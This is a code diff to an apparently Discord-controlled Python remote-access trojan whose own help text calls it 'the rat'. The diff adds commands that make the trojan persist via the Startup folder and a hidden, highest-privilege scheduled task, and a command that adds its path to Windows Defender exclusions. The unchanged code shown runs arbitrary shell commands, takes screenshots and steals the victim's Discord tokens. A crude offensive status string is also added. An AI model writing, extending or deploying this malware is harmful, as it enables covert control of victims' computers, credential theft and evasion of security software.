@@ -13,9 +13,10 @@ from win32crypt import CryptUnprotectData
 import re
 import win32com.client as wincl
 import pyautogui
+import shutil
 
 #token = sys.argv[1]
-token = "YOUR_BOT_TOKEN"
+token = "YOUR_WEBHOOK_HERE"
 
 kdot = commands.Bot(command_prefix=".", intents=discord.Intents.all())
 kdot.remove_command("help")
@@ -87,6 +88,8 @@ async def on_ready():
     channel_stuff = discord.utils.get(guild.channels, name=channel_name)
     channel_id = channel_stuff.id
     await guild.get_channel(channel_id).send(embed=embed, content="@everyone")
+    status = "Gay Hentai"
+    await kdot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=status))
 
     print("Connected")
 
@@ -117,7 +120,10 @@ async def help(ctx):
 {prefix}hide - Hides the rat
 {prefix}unhide - Unhides the rat
 {prefix}delete <session_num> - Deletes the session of your choice (1, 2, 3, etc) or if you say "all" it will delete all sessions
-{prefix}tokens - Gets all the tokens of the user"""
+{prefix}tokens - Gets all the tokens of the user
+{prefix}startup_normal - Adds the rat to startup (normal)
+{prefix}startup_persistent - Adds the rat to startup (requires admin)
+{prefix}exclusion - Adds the rat to the windows defender exclusions"""
     await ctx.send(file=discord.File(io.BytesIO(commands_list.encode()), filename="commands.txt"), content="Commands:")
 
 
@@ -171,7 +177,8 @@ async def screenshot(ctx):
     image.save("screenshot.png")
     await ctx.send(file=discord.File("screenshot.png"))
     os.remove("screenshot.png")
-    
+
+
 @kdot.command()
 async def hide(ctx):
     await ctx.send("Hiding window... This has to make a new process so it might take a second.")
@@ -179,13 +186,15 @@ async def hide(ctx):
     print(text)
     os.system(text)
     os._exit(0)
-    
+
+
 @kdot.command()
 async def show(ctx):
     await ctx.send("Showing window... This has to make a new process so it might take a second.")
     text = f"powershell -c \"Start-Process {__file__}\""
     os.system(text)
     os._exit(0)
+
 
 @kdot.command()
 async def cmd(ctx, *, command):
@@ -241,7 +250,7 @@ async def download(ctx):
 
 
 @kdot.command()
-async def message(ctx, title, *, message):
+async def messagebox(ctx, title, *, message):
     if ctx.channel.name != channel_name:
         return
     Message_box = ctypes.windll.user32.MessageBoxW
@@ -263,7 +272,42 @@ async def cd(ctx, *, directory):
         return
     os.chdir(directory)
     await ctx.send("Changed directory to: " + os.getcwd())
-
+    
+@kdot.command()
+async def startup_normal(ctx):
+    if ctx.channel.name != channel_name:
+        return
+    if is_admin():
+        startup_dir = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+        file_name = __file__.split("\\")[-1]
+        shutil.copyfile(__file__, os.path.join(startup_dir, file_name))
+        await ctx.send("Added to startup!")
+    else:
+        await ctx.send("You need to be an admin to do this!")
+    
+@kdot.command()
+async def startup_persistant(ctx):
+    if ctx.channel.name != channel_name:
+        return
+    if is_admin():
+        # make task scheduled task that runs on startup
+        task_name = "Kdot"
+        os.system(f"schtasks /create /f /rl highest /sc onstart /tn {task_name} /tr \"'cmd.exe' /c powershell Start-Process -WindowStyle Hidden {__file__}\"")
+        os.system('cls')
+        await ctx.send("Added to startup!")
+    else:
+        await ctx.send("You need to be an admin to do this!")
+        
+@kdot.command()
+async def exclusion(ctx):
+    if ctx.channel.name != channel_name:
+        return
+    if is_admin():
+        # add to exclusions
+        os.system(f"powershell Add-MpPreference -ExclusionPath \"{__file__}\"")
+        await ctx.send("Added to exclusions!")
+    else:
+        await ctx.send("You need to be an admin to do this!")
 
 @kdot.command()
 async def tokens(ctx):
@@ -411,6 +455,7 @@ def get_tokens():
         if r.status_code == 200:
             working.append(token)
         return working
+
 
 if __name__ == "__main__":
     kdot.run(token, log_handler=None)
